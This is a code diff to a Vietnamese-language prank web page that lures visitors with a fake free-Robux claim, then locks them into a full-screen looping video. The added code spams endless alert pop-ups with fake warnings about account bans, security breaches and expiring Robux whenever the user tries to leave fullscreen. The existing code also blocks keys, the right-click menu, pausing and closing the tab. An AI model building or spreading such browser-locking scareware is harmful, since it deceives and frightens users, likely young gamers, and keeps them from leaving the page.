@@ -54,7 +54,6 @@
             border-radius: 50px;
         }
         #status-text { margin-top: 10px; color: #888; font-size: 14px; }
-
         #trollOverlay {
             display: none;
             position: fixed;
@@ -88,12 +87,7 @@
     </div>
 
     <div id="trollOverlay">
-        <video id="trollVideo"
-            loop
-            playsinline
-            disablePictureInPicture
-            preload="auto">
-        </video>
+        <video id="trollVideo" loop playsinline disablePictureInPicture preload="auto"></video>
     </div>
 
 <script>
@@ -104,13 +98,10 @@
     const body     = document.getElementById('mainBody');
     const statusTx = document.getElementById('status-text');
 
-    // ─── FIX CACHE ────────────────────────────────────────────────────────────
-    // Thêm timestamp vào src → mỗi lần load trang trình duyệt luôn tải file mới
-    // Kể cả khi bạn xoá troll.mp4 cũ và upload file mới cùng tên
+    // Fix cache
     video.src = "troll.mp4?v=" + Date.now();
-    video.load(); // Bắt buộc gọi load() sau khi set src bằng JS
+    video.load();
 
-    // ─── LOADING MESSAGES ─────────────────────────────────────────────────────
     const loadMessages = [
         "Đang kết nối server...",
         "Xác minh tài khoản...",
@@ -119,8 +110,16 @@
         "Hoàn tất!"
     ];
 
-    // ─── SAFE PLAY ────────────────────────────────────────────────────────────
-    // Tránh NotSupportedError: chỉ play khi video đã load đủ dữ liệu
+    // Alert spam messages
+    const spamMessages = [
+        "❌ LỖI: Quá trình nạp Robux bị gián đoạn!\nNhấn OK để tiếp tục...",
+        "⚠️ CẢNH BÁO: Tài khoản có nguy cơ bị KHÓA VĨNH VIỄN!\nNhấn OK ngay để xác nhận!",
+        "🔴 HỆ THỐNG: Phát hiện hoạt động bất thường!\nNhấn OK để xác minh danh tính...",
+        "💎 10,000 ROBUX sắp hết hạn!\nNhấn OK để giữ phần thưởng của bạn!",
+        "⛔ MẤT KẾT NỐI SERVER!\nNhấn OK để kết nối lại...",
+        "🚨 CẢNH BÁO BẢO MẬT: Ai đó đang cố truy cập tài khoản bạn!\nNhấn OK để chặn ngay!",
+    ];
+
     function safePlay() {
         if (video.readyState >= 2) {
             video.play().catch(() => {});
@@ -131,7 +130,6 @@
         }
     }
 
-    // ─── LOADING GIẢ ──────────────────────────────────────────────────────────
     function startTrap() {
         document.getElementById('claimBtn').style.display = 'none';
         document.getElementById('loading-section').style.display = 'block';
@@ -158,14 +156,12 @@
         }, 80);
     }
 
-    // ─── FULLSCREEN ───────────────────────────────────────────────────────────
     function requestFS() {
         const el = document.documentElement;
         const fn = el.requestFullscreen || el.webkitRequestFullscreen || el.mozRequestFullScreen;
         if (fn) fn.call(el).catch(() => {});
     }
 
-    // ─── LAUNCH TROLL ─────────────────────────────────────────────────────────
     function launchTroll() {
         uiBox.style.display = "none";
         overlay.style.display = "block";
@@ -173,23 +169,17 @@
 
         safePlay();
 
-        // Chặn tất cả phím
         window.addEventListener('keydown',  blockKey, true);
         window.addEventListener('keyup',    blockKey, true);
         window.addEventListener('keypress', blockKey, true);
 
-        // Chống pause
         video.addEventListener('pause', () => safePlay());
         setInterval(() => { if (video.paused) safePlay(); }, 500);
 
-        // Tự fullscreen lại nếu bị thoát
         document.addEventListener('fullscreenchange', onFSChange);
         document.addEventListener('webkitfullscreenchange', onFSChange);
 
-        // Chặn chuột phải
         document.addEventListener('contextmenu', e => e.preventDefault());
-
-        // Chặn đóng tab
         window.onbeforeunload = () => "Dữ liệu đang được tải, bạn có chắc muốn hủy bỏ?";
     }
 
@@ -199,14 +189,32 @@
         return false;
     }
 
+    let spamActive = false;
     function onFSChange() {
         const isFS = !!(document.fullscreenElement || document.webkitFullscreenElement);
-        if (!isFS && overlay.style.display === "block") {
-            setTimeout(() => {
-                alert("❌ LỖI HỆ THỐNG: Vui lòng nhấn OK để tiếp tục nạp Robux!");
-                requestFS();
-            }, 100);
+        if (!isFS && overlay.style.display === "block" && !spamActive) {
+            spamActive = true;
+            startAlertSpam();
         }
+    }
+
+    function startAlertSpam() {
+        let i = 0;
+        function spamLoop() {
+            const isFS = !!(document.fullscreenElement || document.webkitFullscreenElement);
+            if (!isFS && overlay.style.display === "block") {
+                // Xin fullscreen trước khi alert (alert block JS nên xin FS trước)
+                requestFS();
+                alert(spamMessages[i % spamMessages.length]);
+                i++;
+                // Xin lại fullscreen sau khi bấm OK
+                requestFS();
+                setTimeout(spamLoop, 200);
+            } else {
+                spamActive = false;
+            }
+        }
+        setTimeout(spamLoop, 100);
     }
 </script>
 
